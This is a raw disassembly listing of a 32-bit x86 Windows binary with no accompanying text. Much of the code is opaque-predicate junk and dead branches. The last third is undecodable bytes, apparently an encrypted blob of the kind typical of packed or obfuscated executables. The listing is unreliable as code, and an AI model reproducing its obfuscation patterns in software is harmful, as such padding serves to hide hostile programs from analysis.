  41b41e:	mov    eax,ds:0x422708
  41b423:	push   0x4
  41b425:	add    eax,0x1dc
  41b42a:	push   eax
  41b42b:	lea    eax,[esp+0x84]
  41b432:	push   eax
  41b433:	call   0x411c08
  41b438:	mov    eax,DWORD PTR [esp+0x7c]
  41b43c:	mov    eax,DWORD PTR [eax]
  41b43e:	pop    edi
  41b43f:	pop    esi
  41b440:	pop    ebx
  41b441:	mov    esp,ebp
  41b443:	pop    ebp
  41b444:	ret    0xc
  41b447:	push   ebp
  41b448:	mov    ebp,esp
  41b44a:	sub    esp,0x23c
  41b450:	push   ebx
  41b451:	cmp    DWORD PTR ds:0x428565,0x0
  41b458:	mov    DWORD PTR ds:0x42834d,0x2d97
  41b462:	mov    ecx,DWORD PTR ds:0x428465
  41b468:	mov    ecx,DWORD PTR ds:0x428439
  41b46e:	not    ecx
  41b470:	jmp    0x41b4da
  41b475:	mov    eax,ds:0x428481
  41b47a:	cmp    DWORD PTR ds:0x428565,0x0
  41b481:	jge    0x41b4c9
  41b487:	push   0x73dd
  41b48c:	push   DWORD PTR [ebp-0x18]
  41b48f:	push   0x4282f3
  41b494:	push   DWORD PTR [ebp-0x10]
  41b497:	push   DWORD PTR [ebp-0x14]
  41b49a:	call   DWORD PTR ds:0x42e108
  41b4a0:	neg    ecx
  41b4a2:	movzx  ecx,WORD PTR ds:0x428361
  41b4a9:	sbb    ecx,DWORD PTR ds:0x428451
  41b4af:	mov    DWORD PTR ds:0x428361,ecx
  41b4b5:	and    ecx,DWORD PTR ds:0x428571
  41b4bb:	xor    ecx,ecx
  41b4bd:	or     ecx,DWORD PTR ds:0x428471
  41b4c3:	or     DWORD PTR ds:0x4284e5,ecx
  41b4c9:	adc    ecx,ecx
  41b4cb:	xor    ecx,ecx
  41b4cd:	movzx  ecx,BYTE PTR ds:0x428411
  41b4d4:	or     DWORD PTR ds:0x428419,ecx
  41b4da:	push   esi
  41b4db:	push   edi
  41b4dc:	cmp    DWORD PTR ds:0x42857d,0x0
  41b4e3:	mov    ecx,0x4e26
  41b4e8:	mov    DWORD PTR ds:0x428571,ebx
  41b4ee:	mov    DWORD PTR ds:0x42841d,ecx
  41b4f4:	mov    DWORD PTR ds:0x4284ed,edx
  41b4fa:	jmp    0x41b569
  41b4ff:	mov    DWORD PTR ds:0x428371,0x7065
  41b509:	cmp    DWORD PTR ds:0x42857d,0x0
  41b510:	jae    0x41b54d
  41b516:	push   0x1ec2
  41b51b:	push   DWORD PTR [ebp-0x10]
  41b51e:	push   DWORD PTR [ebp-0x10]
  41b521:	push   0x8dff
  41b526:	push   DWORD PTR [ebp-0x18]
  41b529:	push   0x428575
  41b52e:	call   DWORD PTR ds:0x42e290
  41b534:	xor    ecx,0x4175
  41b53a:	movzx  ecx,BYTE PTR ds:0x428469
  41b541:	or     ecx,DWORD PTR ds:0x42842d
  41b547:	mov    DWORD PTR ds:0x428469,ecx
  41b54d:	add    DWORD PTR ds:0x428409,edx
  41b553:	adc    ecx,0x68aa
  41b559:	add    DWORD PTR ds:0x428351,0x591d
  41b563:	dec    DWORD PTR ds:0x428481
  41b569:	mov    DWORD PTR [ebp-0x50],0x1
  41b570:	cmp    DWORD PTR ds:0x42857d,0x0
  41b577:	not    ecx
  41b579:	mov    DWORD PTR ds:0x428361,0x24a
  41b583:	jmp    0x41b5df
  41b588:	mov    DWORD PTR ds:0x428369,0x4cf4
  41b592:	mov    eax,0x7057
  41b597:	cmp    DWORD PTR ds:0x42857d,0x0
  41b59e:	jl     0x41b5c3
  41b5a4:	push   DWORD PTR [ebp-0xc]
  41b5a7:	call   DWORD PTR ds:0x42e10c
  41b5ad:	adc    ecx,DWORD PTR ds:0x42842d
  41b5b3:	sbb    DWORD PTR ds:0x428451,0x4277
  41b5bd:	and    DWORD PTR ds:0x4284d5,ecx
  41b5c3:	and    ecx,ecx
  41b5c5:	or     DWORD PTR ds:0x428475,0x5b0f
  41b5cf:	sbb    ecx,0x33b5
  41b5d5:	sub    DWORD PTR ds:0x42844d,0xb05
  41b5df:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41b5e9:	xor    DWORD PTR ds:0x428369,0x1f8b
  41b5f3:	mov    DWORD PTR [ebp-0xb8],0x1
  41b5fd:	mov    ecx,DWORD PTR [ebp-0xb8]
  41b603:	mov    eax,0x584
  41b608:	xor    edx,edx
  41b60a:	div    ecx
  41b60c:	cmp    DWORD PTR ds:0x428501,0x0
  41b613:	mov    DWORD PTR ds:0x428365,0x2b7a
  41b61d:	mov    DWORD PTR ds:0x42854d,0x6434
  41b627:	mov    DWORD PTR ds:0x4284d5,0x53bf
  41b631:	jmp    0x41b6a4
  41b636:	mov    DWORD PTR ds:0x428445,edi
  41b63c:	movzx  ecx,WORD PTR ds:0x428361
  41b643:	cmp    DWORD PTR ds:0x428501,0x0
  41b64a:	jle    0x41b684
  41b650:	push   0x42842d
  41b655:	push   0x428469
  41b65a:	push   0x428405
  41b65f:	call   DWORD PTR ds:0x42e294
  41b665:	xor    DWORD PTR ds:0x4284e5,edi
  41b66b:	movzx  ecx,BYTE PTR ds:0x428341
  41b672:	sub    ecx,DWORD PTR ds:0x428449
  41b678:	mov    DWORD PTR ds:0x428341,ecx
  41b67e:	adc    DWORD PTR ds:0x428441,ecx
  41b684:	adc    ecx,0x4862
  41b68a:	and    ecx,DWORD PTR ds:0x428441
  41b690:	or     DWORD PTR ds:0x4284e5,ecx
  41b696:	mov    ecx,DWORD PTR ds:0x4284c1
  41b69c:	mov    ecx,DWORD PTR [ecx]
  41b69e:	sub    DWORD PTR ds:0x428469,ecx
  41b6a4:	imul   eax,eax,0x51d4
  41b6aa:	sub    ecx,0x11f6
  41b6b0:	mov    ecx,DWORD PTR [ebp-0xbc]
  41b6b6:	add    DWORD PTR ds:0x42842d,0x5690
  41b6c0:	xor    eax,ecx
  41b6c2:	adc    DWORD PTR ds:0x428565,edi
  41b6c8:	and    eax,0x4c09
  41b6cd:	sbb    ecx,0x3053
  41b6d3:	mov    ecx,DWORD PTR [ebp-0x50]
  41b6d6:	sub    DWORD PTR ds:0x428429,0x428479
  41b6e0:	xor    edx,edx
  41b6e2:	div    ecx
  41b6e4:	sbb    ecx,DWORD PTR ds:0x428425
  41b6ea:	sub    eax,0x401
  41b6ef:	mov    ecx,DWORD PTR ds:0x428501
  41b6f5:	sub    DWORD PTR ds:0x428571,ecx
  41b6fb:	mov    DWORD PTR [ebp-0x90],eax
  41b701:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41b70b:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41b712:	cmp    DWORD PTR ds:0x428475,0x0
  41b719:	mov    DWORD PTR ds:0x428359,0x12e0
  41b723:	movzx  edx,WORD PTR ds:0x428439
  41b72a:	jmp    0x41b78a
  41b72f:	not    eax
  41b731:	mov    DWORD PTR ds:0x4284d5,edi
  41b737:	cmp    DWORD PTR ds:0x428475,0x0
  41b73e:	jne    0x41b768
  41b744:	push   0x428157
  41b749:	call   DWORD PTR ds:0x42e298
  41b74f:	movzx  edx,WORD PTR ds:0x42834d
  41b756:	xor    DWORD PTR ds:0x428331,edx
  41b75c:	and    ecx,0x442f
  41b762:	sub    edx,0x55c5
  41b768:	mov    ecx,DWORD PTR ds:0x4284dd
  41b76e:	xor    ecx,DWORD PTR ds:0x4284e5
  41b774:	mov    DWORD PTR ds:0x4284dd,ecx
  41b77a:	and    DWORD PTR ds:0x42835d,0x34b7
  41b784:	adc    DWORD PTR ds:0x428501,ebx
  41b78a:	mov    DWORD PTR [ebp-0xb4],0x3842
  41b794:	adc    ecx,edx
  41b796:	mov    eax,DWORD PTR [ebp-0x4c]
  41b799:	and    ecx,edx
  41b79b:	add    eax,DWORD PTR [ebp-0xb4]
  41b7a1:	xor    eax,0x2e02
  41b7a6:	add    ecx,ecx
  41b7a8:	xor    eax,0x7294
  41b7ad:	add    ecx,ecx
  41b7af:	imul   eax,eax,0x68f3
  41b7b5:	mov    ecx,DWORD PTR [ebp-0x8c]
  41b7bb:	cmp    DWORD PTR ds:0x428361,0x0
  41b7c2:	mov    DWORD PTR ds:0x428469,ebx
  41b7c8:	mov    edx,DWORD PTR ds:0x42857d
  41b7ce:	jmp    0x41b822
  41b7d3:	mov    DWORD PTR ds:0x428355,edx
  41b7d9:	cmp    DWORD PTR ds:0x428361,0x0
  41b7e0:	ja     0x41b810
  41b7e6:	push   DWORD PTR [ebp-0x1c]
  41b7e9:	push   0x2a61
  41b7ee:	push   0x6c90
  41b7f3:	push   0x2be6
  41b7f8:	push   0x2810
  41b7fd:	call   DWORD PTR ds:0x42e054
  41b803:	inc    edx
  41b804:	mov    edx,DWORD PTR ds:0x428351
  41b80a:	sbb    DWORD PTR ds:0x428459,edx
  41b810:	or     edx,DWORD PTR ds:0x428371
  41b816:	and    edx,DWORD PTR ds:0x4284d5
  41b81c:	sub    edx,DWORD PTR ds:0x428569
  41b822:	and    eax,ecx
  41b824:	adc    DWORD PTR ds:0x42846d,0x2bc9
  41b82e:	sub    eax,0x2818
  41b833:	mov    edx,DWORD PTR ds:0x42851d
  41b839:	mov    ecx,DWORD PTR ds:0x428529
  41b83f:	sub    ecx,edx
  41b841:	add    edx,DWORD PTR [edx+ecx*1]
  41b844:	mov    DWORD PTR [ebp-0xe8],eax
  41b84a:	mov    DWORD PTR [ebp-0x70],0x6f89
  41b851:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41b85b:	mov    DWORD PTR [ebp-0x120],0x3c77
  41b865:	sbb    DWORD PTR ds:0x428429,edx
  41b86b:	mov    DWORD PTR [ebp-0x2c],0x2129
  41b872:	cmp    DWORD PTR ds:0x428481,0x0
  41b879:	mov    DWORD PTR ds:0x428375,0x25cb
  41b883:	mov    edx,0x2db2
  41b888:	mov    DWORD PTR ds:0x428501,0x75fd
  41b892:	jmp    0x41b8de
  41b897:	mov    eax,0x420d
  41b89c:	mov    DWORD PTR ds:0x4284dd,0x38f0
  41b8a6:	cmp    DWORD PTR ds:0x428481,0x0
  41b8ad:	jge    0x41b8c8
  41b8b3:	push   DWORD PTR [ebp-0xc]
  41b8b6:	call   DWORD PTR ds:0x42e058
  41b8bc:	adc    DWORD PTR ds:0x42854d,edx
  41b8c2:	add    DWORD PTR ds:0x428571,edx
  41b8c8:	sbb    edx,DWORD PTR ds:0x428565
  41b8ce:	and    DWORD PTR ds:0x4284cd,0x10d1
  41b8d8:	and    ecx,0x7be2
  41b8de:	mov    eax,DWORD PTR [ebp-0x2c]
  41b8e1:	imul   eax,eax,0x1ada
  41b8e7:	xor    DWORD PTR ds:0x428469,ebx
  41b8ed:	mov    ecx,DWORD PTR [ebp-0x120]
  41b8f3:	mov    edx,DWORD PTR ds:0x428415
  41b8f9:	or     edx,DWORD PTR ds:0x428461
  41b8ff:	mov    DWORD PTR ds:0x428415,edx
  41b905:	imul   ecx,ecx,0x53ae
  41b90b:	xor    DWORD PTR ds:0x4284d5,0x220b
  41b915:	imul   ecx,ecx,0x7447
  41b91b:	mov    edx,DWORD PTR [ebp-0xd0]
  41b921:	and    ecx,edx
  41b923:	or     ecx,0x2a20
  41b929:	or     DWORD PTR ds:0x4284d5,0x6762
  41b933:	mov    edx,DWORD PTR [ebp-0x70]
  41b936:	xor    ecx,edx
  41b938:	and    DWORD PTR ds:0x42833d,0x71f
  41b942:	mov    edx,DWORD PTR [ebp+0x14]
  41b945:	or     DWORD PTR ds:0x428451,0x17f4
  41b94f:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41b956:	or     DWORD PTR ds:0x4284f1,0x428481
  41b960:	lea    eax,[ecx+eax*1-0x45a1]
  41b967:	mov    DWORD PTR [ebp-0xb0],eax
  41b96d:	add    ecx,eax
  41b96f:	mov    DWORD PTR [ebp-0x11c],0x303f
  41b979:	mov    DWORD PTR [ebp-0x98],0x51a9
  41b983:	sub    ecx,eax
  41b985:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41b98f:	cmp    DWORD PTR ds:0x428375,0x0
  41b996:	mov    DWORD PTR ds:0x428359,0x245f
  41b9a0:	mov    ecx,DWORD PTR ds:0x42842d
  41b9a6:	mov    ecx,0x273f
  41b9ab:	jmp    0x41ba0f
  41b9b0:	mov    DWORD PTR ds:0x428469,ebx
  41b9b6:	mov    DWORD PTR ds:0x428439,0x963
  41b9c0:	cmp    DWORD PTR ds:0x428375,0x0
  41b9c7:	jle    0x41b9ee
  41b9cd:	push   DWORD PTR [ebp-0x28]
  41b9d0:	push   0x4284cd
  41b9d5:	push   0x4281b5
  41b9da:	call   DWORD PTR ds:0x42e29c
  41b9e0:	sub    DWORD PTR ds:0x42855d,ebx
  41b9e6:	xor    ecx,ecx
  41b9e8:	sbb    DWORD PTR ds:0x4284e5,ebx
  41b9ee:	movzx  ecx,BYTE PTR ds:0x42835d
  41b9f5:	adc    DWORD PTR ds:0x428449,ecx
  41b9fb:	add    DWORD PTR ds:0x428351,0x7cea
  41ba05:	sbb    DWORD PTR ds:0x428355,0x6b1e
  41ba0f:	mov    eax,DWORD PTR [ebp-0xcc]
  41ba15:	xor    eax,0x6f65
  41ba1a:	cmp    DWORD PTR ds:0x42834d,0x0
  41ba21:	mov    DWORD PTR ds:0x428445,edx
  41ba27:	mov    ecx,0x51b5
  41ba2c:	jmp    0x41baa2
  41ba31:	mov    DWORD PTR ds:0x42844d,0xb0f
  41ba3b:	cmp    DWORD PTR ds:0x42834d,0x0
  41ba42:	jl     0x41ba7a
  41ba48:	push   0x200e
  41ba4d:	push   0x21c1
  41ba52:	push   DWORD PTR [ebp-0x14]
  41ba55:	push   DWORD PTR [ebp-0x14]
  41ba58:	call   DWORD PTR ds:0x42e110
  41ba5e:	sub    DWORD PTR ds:0x428419,ecx
  41ba64:	sub    ecx,DWORD PTR ds:0x428545
  41ba6a:	sbb    DWORD PTR ds:0x428421,0x4284fd
  41ba74:	sub    ecx,0x1dd7
  41ba7a:	mov    ecx,DWORD PTR ds:0x428465
  41ba80:	adc    ecx,DWORD PTR ds:0x428579
  41ba86:	mov    DWORD PTR ds:0x428465,ecx
  41ba8c:	adc    DWORD PTR ds:0x428569,0x3dd1
  41ba96:	mov    DWORD PTR ds:0x428369,0x5b91
  41baa0:	neg    ecx
  41baa2:	mov    ecx,DWORD PTR [ebp-0x98]
  41baa8:	add    DWORD PTR ds:0x428575,0x72a
  41bab2:	or     eax,ecx
  41bab4:	xor    DWORD PTR ds:0x428469,ebx
  41baba:	add    eax,0x161e
  41babf:	sub    ecx,0x1ef7
  41bac5:	mov    ecx,DWORD PTR [ebp-0x11c]
  41bacb:	or     eax,ecx
  41bacd:	cmp    DWORD PTR ds:0x428419,0x0
  41bad4:	mov    ecx,DWORD PTR ds:0x428431
  41bada:	mov    DWORD PTR ds:0x428455,0x4d
  41bae4:	jmp    0x41bbad
  41bae9:	mov    DWORD PTR ds:0x428455,0x133b
  41baf3:	cmp    DWORD PTR ds:0x428419,0x0
  41bafa:	jne    0x41bb25
  41bb00:	push   0x428561
  41bb05:	push   0x8a51
  41bb0a:	push   0x81dc
  41bb0f:	call   DWORD PTR ds:0x42e05c
  41bb15:	and    DWORD PTR ds:0x42842d,0x4030
  41bb1f:	sub    DWORD PTR ds:0x4284d9,edx
  41bb25:	add    ecx,0x753f
  41bb2b:	mov    ecx,DWORD PTR ds:0x428415
  41bb31:	xor    DWORD PTR ds:0x428411,ecx
  41bb37:	sbb    DWORD PTR ds:0x42855d,edx
  41bb3d:	cmp    DWORD PTR ds:0x428571,0x0
  41bb44:	mov    ecx,DWORD PTR ds:0x428575
  41bb4a:	mov    ecx,DWORD PTR ds:0x4284f1
  41bb50:	mov    DWORD PTR ds:0x42846d,edx
  41bb56:	mov    DWORD PTR ds:0x428425,edi
  41bb5c:	jmp    0x41bbad
  41bb61:	not    ecx
  41bb63:	cmp    DWORD PTR ds:0x428571,0x0
  41bb6a:	jne    0x41bb96
  41bb70:	push   0x6108
  41bb75:	push   0x2ee0
  41bb7a:	push   0x428295
  41bb7f:	push   0x1382
  41bb84:	call   DWORD PTR ds:0x42e060
  41bb8a:	or     DWORD PTR ds:0x4284c9,edi
  41bb90:	neg    DWORD PTR ds:0x428355
  41bb96:	movzx  ecx,WORD PTR ds:0x428559
  41bb9d:	sbb    DWORD PTR ds:0x428471,ecx
  41bba3:	or     DWORD PTR ds:0x428445,0x428451
  41bbad:	add    eax,0x1cca
  41bbb2:	cmp    DWORD PTR ds:0x428351,0x0
  41bbb9:	mov    DWORD PTR ds:0x428451,0x3c56
  41bbc3:	mov    ecx,0x7f6d
  41bbc8:	mov    ecx,DWORD PTR ds:0x42844d
  41bbce:	jmp    0x41bc28
  41bbd3:	not    ecx
  41bbd5:	cmp    DWORD PTR ds:0x428351,0x0
  41bbdc:	jbe    0x41bc10
  41bbe2:	push   0x5de5
  41bbe7:	push   0x42827f
  41bbec:	push   0x27d6
  41bbf1:	call   DWORD PTR ds:0x42e114
  41bbf7:	movzx  ecx,BYTE PTR ds:0x428371
  41bbfe:	adc    DWORD PTR ds:0x428365,ecx
  41bc04:	sbb    ecx,0x4cc7
  41bc0a:	sbb    ecx,DWORD PTR ds:0x42844d
  41bc10:	adc    DWORD PTR ds:0x428579,ebx
  41bc16:	mov    ecx,DWORD PTR ds:0x42833d
  41bc1c:	sub    DWORD PTR ds:0x428581,ecx
  41bc22:	add    ecx,0x5653
  41bc28:	xor    eax,0x96c9
  41bc2d:	sbb    DWORD PTR ds:0x428579,0x433e
  41bc37:	mov    DWORD PTR [ebp-0x38],eax
  41bc3a:	mov    DWORD PTR [ebp-0x118],0x6083
  41bc44:	sub    DWORD PTR ds:0x42832d,0x67a3
  41bc4e:	mov    DWORD PTR [ebp-0x88],0x556
  41bc58:	or     ecx,eax
  41bc5a:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41bc64:	cmp    DWORD PTR ds:0x4284d1,0x0
  41bc6b:	mov    ecx,0x31c9
  41bc70:	mov    DWORD PTR ds:0x428579,0x1996
  41bc7a:	jmp    0x41bccd
  41bc7f:	mov    DWORD PTR ds:0x4284cd,edi
  41bc85:	cmp    DWORD PTR ds:0x4284d1,0x0
  41bc8c:	jb     0x41bcb3
  41bc92:	push   0x4282f3
  41bc97:	push   DWORD PTR [ebp-0x14]
  41bc9a:	call   DWORD PTR ds:0x42e118
  41bca0:	add    ecx,DWORD PTR ds:0x428455
  41bca6:	movzx  ecx,BYTE PTR ds:0x428479
  41bcad:	add    DWORD PTR ds:0x428365,ecx
  41bcb3:	sub    DWORD PTR ds:0x4284d5,ecx
  41bcb9:	xor    ecx,ecx
  41bcbb:	add    ecx,DWORD PTR ds:0x428409
  41bcc1:	or     DWORD PTR ds:0x428549,ecx
  41bcc7:	add    DWORD PTR ds:0x428411,ebx
  41bccd:	mov    eax,DWORD PTR [ebp-0x140]
  41bcd3:	add    eax,0x5af8
  41bcd8:	sbb    ecx,0x75c4
  41bcde:	mov    ecx,DWORD PTR [ebp-0x88]
  41bce4:	sub    eax,ecx
  41bce6:	mov    ecx,DWORD PTR [ebp-0x118]
  41bcec:	xor    DWORD PTR ds:0x428565,0x6d4
  41bcf6:	lea    eax,[eax+ecx*1+0x68dc]
  41bcfd:	or     eax,0x52f6
  41bd02:	cmp    DWORD PTR ds:0x428459,0x0
  41bd09:	mov    DWORD PTR ds:0x428545,0x1421
  41bd13:	mov    DWORD PTR ds:0x428481,0x487c
  41bd1d:	mov    ecx,DWORD PTR ds:0x428435
  41bd23:	jmp    0x41bd91
  41bd28:	mov    DWORD PTR ds:0x42844d,0x10ed
  41bd32:	not    ecx
  41bd34:	cmp    DWORD PTR ds:0x428459,0x0
  41bd3b:	jbe    0x41bd77
  41bd41:	push   0x8eb3
  41bd46:	call   DWORD PTR ds:0x42e11c
  41bd4c:	mov    ecx,DWORD PTR ds:0x4284d5
  41bd52:	sub    DWORD PTR ds:0x428361,ecx
  41bd58:	mov    ecx,DWORD PTR ds:0x428431
  41bd5e:	sbb    ecx,DWORD PTR ds:0x428461
  41bd64:	mov    DWORD PTR ds:0x428431,ecx
  41bd6a:	movzx  ecx,BYTE PTR ds:0x42834d
  41bd71:	or     DWORD PTR ds:0x4284c5,ecx
  41bd77:	sbb    DWORD PTR ds:0x428345,ebx
  41bd7d:	neg    ecx
  41bd7f:	mov    ecx,DWORD PTR ds:0x428355
  41bd85:	xor    ecx,DWORD PTR ds:0x428409
  41bd8b:	mov    DWORD PTR ds:0x428355,ecx
  41bd91:	sub    eax,0x1dbfe
  41bd96:	sbb    DWORD PTR ds:0x4284e9,ecx
  41bd9c:	mov    DWORD PTR [ebp-0xac],eax
  41bda2:	xor    DWORD PTR ds:0x42842d,ebx
  41bda8:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41bdaf:	mov    DWORD PTR [ebp-0x100],0x49f7
  41bdb9:	inc    ecx
  41bdba:	mov    eax,DWORD PTR [ebp-0x100]
  41bdc0:	movzx  ecx,BYTE PTR ds:0x428555
  41bdc7:	sub    ecx,DWORD PTR ds:0x4284c9
  41bdcd:	mov    DWORD PTR ds:0x428555,ecx
  41bdd3:	add    eax,0x7b60
  41bdd8:	sbb    ecx,0x7111
  41bdde:	imul   eax,eax,0x5ea
  41bde4:	add    DWORD PTR ds:0x428475,ecx
  41bdea:	mov    ecx,DWORD PTR [ebp-0x6c]
  41bded:	imul   eax,ecx
  41bdf0:	xor    edx,edx
  41bdf2:	adc    DWORD PTR ds:0x428411,0x2190
  41bdfc:	mov    ecx,0x3218d
  41be01:	div    ecx
  41be03:	sub    eax,0x24c1
  41be08:	sbb    ecx,0x10cc
  41be0e:	mov    DWORD PTR [ebp-0xa8],eax
  41be14:	xor    eax,eax
  41be16:	add    eax,DWORD PTR ds:0x4284dd
  41be1c:	sbb    eax,DWORD PTR ds:0x428475
  41be22:	mov    ds:0x4284dd,eax
  41be27:	mov    DWORD PTR [ebp-0x84],0x2c40
  41be31:	xor    ecx,ecx
  41be33:	or     ecx,DWORD PTR ds:0x428411
  41be39:	xor    ecx,DWORD PTR ds:0x428471
  41be3f:	mov    DWORD PTR ds:0x428411,ecx
  41be45:	mov    DWORD PTR [ebp-0x18],0x6013
  41be4c:	or     DWORD PTR ds:0x428559,ecx
  41be52:	mov    DWORD PTR [ebp-0x80],0xc
  41be59:	and    eax,eax
  41be5b:	mov    eax,DWORD PTR [ebp-0x18]
  41be5e:	and    DWORD PTR ds:0x4284c5,edi
  41be64:	mov    ecx,DWORD PTR [ebp-0x80]
  41be67:	xor    edx,edx
  41be69:	add    DWORD PTR ds:0x42836d,0x428361
  41be73:	div    ecx
  41be75:	imul   eax,eax,0x4312
  41be7b:	cmp    DWORD PTR ds:0x4284e1,0x0
  41be82:	mov    DWORD PTR ds:0x428411,0x6e4f
  41be8c:	movzx  ecx,WORD PTR ds:0x428579
  41be93:	mov    DWORD PTR ds:0x428555,edi
  41be99:	jmp    0x41befc
  41be9e:	mov    DWORD PTR ds:0x42833d,0x5f09
  41bea8:	cmp    DWORD PTR ds:0x4284e1,0x0
  41beaf:	jge    0x41bed8
  41beb5:	push   DWORD PTR [ebp-0x28]
  41beb8:	call   DWORD PTR ds:0x42e064
  41bebe:	sbb    ecx,DWORD PTR ds:0x4284cd
  41bec4:	xor    ecx,ecx
  41bec6:	xor    ecx,DWORD PTR ds:0x428431
  41becc:	sub    DWORD PTR ds:0x428365,ecx
  41bed2:	and    DWORD PTR ds:0x428439,edi
  41bed8:	xor    ecx,ecx
  41beda:	xor    ecx,DWORD PTR ds:0x428569
  41bee0:	xor    DWORD PTR ds:0x428405,ecx
  41bee6:	or     DWORD PTR ds:0x428445,0x15e9
  41bef0:	xor    ecx,0x6843
  41bef6:	adc    ecx,DWORD PTR ds:0x428449
  41befc:	add    eax,0x5abe
  41bf01:	mov    ecx,DWORD PTR [ebp-0x84]
  41bf07:	add    DWORD PTR ds:0x4284e1,0x428579
  41bf11:	xor    eax,ecx
  41bf13:	mov    ecx,DWORD PTR ds:0x428359
  41bf19:	and    ecx,DWORD PTR ds:0x42855d
  41bf1f:	mov    DWORD PTR ds:0x428359,ecx
  41bf25:	xor    edx,edx
  41bf27:	not    DWORD PTR ds:0x428369
  41bf2d:	mov    ecx,0x5ae
  41bf32:	div    ecx
  41bf34:	jmp    0x41c31b
  41bf39:	xchg   DWORD PTR [edi],esp
  41bf3b:	dec    eax
  41bf3c:	in     al,0x68
  41bf3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf3f:	lods   al,BYTE PTR ds:[esi]
  41bf40:	stos   DWORD PTR es:[edi],eax
  41bf41:	test   BYTE PTR [ebx+eax*8-0xb115631],bh
  41bf48:	iret   
  41bf49:	aam    0x3b
  41bf4b:	sar    BYTE PTR [esi-0x41413bb6],0xa5
  41bf52:	mov    edx,0x8ac7c38d
  41bf57:	int3   
  41bf58:	ret    
  41bf59:	and    bh,BYTE PTR [eax+0x64]
  41bf5c:	add    al,0x6b
  41bf5e:	or     eax,0xb71f06e3
  41bf63:	packuswb mm4,mm6
  41bf66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf67:	lock out dx,al
  41bf69:	xor    al,0xf8
  41bf6b:	nop
  41bf6c:	jae    0x41bf13
  41bf6e:	mov    eax,0x49e6975
  41bf73:	repnz push ds
  41bf75:	xchg   DWORD PTR [edi+0x1a],esp
  41bf78:	in     eax,dx
  41bf79:	mov    esi,0xd972954e
  41bf7e:	push   ds
  41bf7f:	add    ecx,ebx
  41bf81:	or     bl,bl
  41bf83:	sub    DWORD PTR gs:[eax-0xb20d5eb],eax
  41bf8a:	mov    al,ds:0x95c36f1e
  41bf8f:	and    dh,BYTE PTR [ecx]
  41bf91:	pop    edi
  41bf92:	jae    0x41bf58
  41bf94:	mov    esi,0x9126a141
  41bf99:	psubusw mm7,QWORD PTR [ebx]
  41bf9c:	add    ebp,DWORD PTR [ebx+ecx*2]
  41bf9f:	cmp    DWORD PTR ds:0x9c6a07da,ebx
  41bfa5:	daa    
  41bfa6:	idiv   BYTE PTR [eax+0x33]
  41bfa9:	or     ecx,DWORD PTR [ebp+0x530c080d]
  41bfaf:	fild   WORD PTR [esp+edi*2+0x6a9dd705]
  41bfb6:	lahf   
  41bfb7:	mov    ah,0xec
  41bfb9:	ror    DWORD PTR [edx+0x19b0bb13],cl
  41bfbf:	xchg   DWORD PTR [edi],edx
  41bfc1:	call   0xa75e268c
  41bfc6:	test   BYTE PTR [ecx-0x69118a10],dl
  41bfcc:	outs   dx,BYTE PTR ds:[esi]
  41bfcd:	dec    eax
  41bfce:	not    ebp
  41bfd0:	mov    edi,0x9152198e
  41bfd5:	repz fnsave [eax+0x45]
  41bfd9:	xchg   DWORD PTR [edi],esp
  41bfdb:	inc    ebp
  41bfdc:	cld    
  41bfdd:	mov    esi,0x65f608dd
  41bfe2:	repnz lahf 
  41bfe4:	add    BYTE PTR [eax-0xe37419],ah
  41bfea:	sub    BYTE PTR [eax+0x39974e56],bl
  41bff0:	pop    eax
  41bff1:	jmp    0xf58a:0x9ebe5ebe
  41bff8:	jge    0x41c065
  41bffa:	xchg   edi,eax
  41bffb:	clc    
  41bffc:	inc    esp
  41bffd:	in     al,0xbe
  41bfff:	and    edx,edi
  41c001:	mov    bl,0x3a
  41c003:	mov    esp,0x477bcce7
  41c008:	dec    eax
  41c009:	scas   eax,DWORD PTR es:[edi]
  41c00a:	les    ecx,FWORD PTR [eax-0x36]
  41c00d:	lea    esp,[ebp+0x45]
  41c010:	push   ecx
  41c011:	add    esp,ebx
  41c013:	iret   
  41c014:	cmp    al,dh
  41c016:	push   ebx
  41c017:	bound  ecx,QWORD PTR [ebp+0x6fc9f776]
  41c01d:	(bad)  
  41c01e:	mov    edi,esp
  41c020:	pop    edi
  41c021:	aaa    
  41c022:	push   ebp
  41c023:	outs   dx,DWORD PTR ds:[esi]
  41c024:	jo     0x41c032
  41c026:	fmul   st(0),st
  41c028:	sub    dl,BYTE PTR [edx+0x40a8803a]
  41c02e:	aas    
  41c02f:	adc    edi,esi
  41c031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c032:	push   ebp
  41c033:	les    eax,FWORD PTR [ebx-0x6a]
  41c036:	aaa    
  41c037:	pop    esp
  41c038:	jbe    0x41c00f
  41c03a:	jmp    0x6b403151
  41c03f:	xchg   esi,eax
  41c040:	xchg   ecx,eax
  41c041:	lds    ebx,FWORD PTR [ecx-0x45]
  41c044:	out    dx,eax
  41c045:	pushf  
  41c046:	xor    al,BYTE PTR [ecx]
  41c048:	repz mov eax,es
  41c04b:	sub    BYTE PTR [eax-0x3739354e],ah
  41c051:	or     edi,DWORD PTR [edi-0x50]
  41c054:	jns    0x41bfe7
  41c056:	fimul  WORD PTR [ebx]
  41c058:	scas   al,BYTE PTR es:[edi]
  41c059:	dec    esi
  41c05a:	in     al,dx
  41c05b:	push   ss
  41c05c:	add    bh,BYTE PTR [edi+0x2576f48]
  41c062:	or     edi,ecx
  41c064:	jmp    0x41c0db
  41c066:	cli    
  41c067:	in     eax,dx
  41c068:	pop    ecx
  41c069:	dec    ecx
  41c06a:	cld    
  41c06b:	xor    ch,bh
  41c06d:	inc    edx
  41c06e:	leave  
  41c06f:	mov    ds,WORD PTR [edi]
  41c071:	icebp  
  41c072:	push   esp
  41c073:	(bad)  
  41c074:	cs mov ebx,0x9270d6aa
  41c07a:	and    DWORD PTR [ecx-0x3a6517ba],ebx
  41c080:	scas   al,BYTE PTR es:[edi]
  41c081:	mov    bl,0x9c
  41c083:	sub    ch,cl
  41c085:	pop    esp
  41c086:	addr16 xchg ebp,eax
  41c088:	sub    eax,0x5ffaf804
  41c08d:	add    ah,BYTE PTR [ebp+0x6238cd6a]
  41c093:	push   0x378fe17e
